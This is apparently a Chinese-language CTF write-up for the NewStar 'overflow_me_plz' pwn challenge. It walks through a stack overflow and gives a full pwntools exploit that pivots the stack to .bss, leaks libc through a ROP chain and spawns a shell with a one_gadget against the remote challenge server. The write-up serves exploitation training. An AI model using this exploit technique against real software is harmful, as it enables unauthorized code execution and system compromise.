---
title: overflow_me_plz
date: 2023-03-19 09:33:11
categories: 
- pwn_wp
tags: 
- pwn
- ROP
- 栈迁移


---

NewStar CTF Week5的题，利用没开PIE的程序的代码片段，多次使用栈迁移。

<!--more-->

查壳，就开了NX

```sh
[*] '/home/a1ph0nse/PwnPractice/CtfGame/NewStar/overflow/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

逆向

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf[192]; // [rsp+0h] [rbp-C0h] BYREF

  init(argc, argv, envp);
  write(1, "So this is not new and difficult for you anymore.\n", 0x33uLL);
  write(1, "Show me if you can pwn it!\n", 0x1CuLL);
  read(0, buf, 0xD0uLL);
  return 0;
}
```

代码简单，是一个纯粹的栈溢出，只能溢出0x10，要通过栈迁移扩充空间，但我们没办法提前泄露栈地址，因此，我们只能迁移到bss段。

通过栈溢出控制rbp后，利用read将数据读入到bss段。

```asm
.text:00000000004006D9 48 8D 85 40 FF FF FF          lea     rax, [rbp+buf]				  ;buf=-0xc0
.text:00000000004006E0 BA D0 00 00 00                mov     edx, 0D0h                       ; nbytes
.text:00000000004006E5 48 89 C6                      mov     rsi, rax                        ; buf
.text:00000000004006E8 BF 00 00 00 00                mov     edi, 0                          ; fd
.text:00000000004006ED E8 3E FE FF FF                call    _read
.text:00000000004006ED
.text:00000000004006F2 B8 00 00 00 00                mov     eax, 0
.text:00000000004006F7 C9                            leave
.text:00000000004006F8 C3                            retn
```

read结束后，栈已经迁移到bss段上。在这次read写入的数据中布置好ROP链用于leak libc，并布置好rbp利用main的leave retn再次进行栈迁移，迁移到ROP链上。

通过这次ROP可以leak libc，我们可以重复这个过程来get shell。

exp:

```py
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='pwn'
elf=ELF('./'+filename)
libc=ELF('libc-2.31.so')
# p=process('./'+filename)
#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})
p=remote('node4.buuoj.cn',26999)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()
    
pop_rdi_ret=0x0000000000400763
pop_rsi_r15_ret=0x0000000000400761
pop_rbp_ret=0x00000000004005b8
pop_r12_r13_r14_r15_ret=0x000000000040075c
leave_ret=0x00000000004006f7
read_addr=0x00000000004006D9
bss_addr=elf.bss()+0x200

ru("Show me if you can pwn it!\n")
payload=b'a'*0xc0+p64(bss_addr)+p64(read_addr)

s(payload)

# start from bss_addr-0xc0
payload=p64(pop_rdi_ret)+p64(1)
payload+=p64(pop_rsi_r15_ret)+p64(elf.got['read'])+p64(0)
payload+=p64(elf.sym['write']) # leak libc
payload+=p64(pop_rbp_ret) # try again to get shell
payload+=p64(bss_addr+0x200)
payload+=p64(read_addr)
payload=payload.ljust(0xc0,b'a')
payload+=p64(bss_addr-0xc0-0x8)+p64(leave_ret) # move to bss_addr-0xc0
leak('bss_addr',hex(bss_addr))

# debug()
s(payload)  

read_addr=uu64(ru('\x7f')[1:])
libcbase=read_addr-libc.sym['read']
leak('read_addr',hex(read_addr))
leak('libcbase',hex(libcbase))

one_gadget=libcbase+0xe3afe

r()
# start from bss_addr+0x200-0xc0
payload=p64(pop_r12_r13_r14_r15_ret)+p64(0)*4
payload+=p64(one_gadget)
payload=payload.ljust(0xc0,b'b')
payload+=p64(bss_addr+0x200-0xc0-0x8)+p64(leave_ret) # move to bss_addr+0x200-0xc0
s(payload)

itr()

# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

```

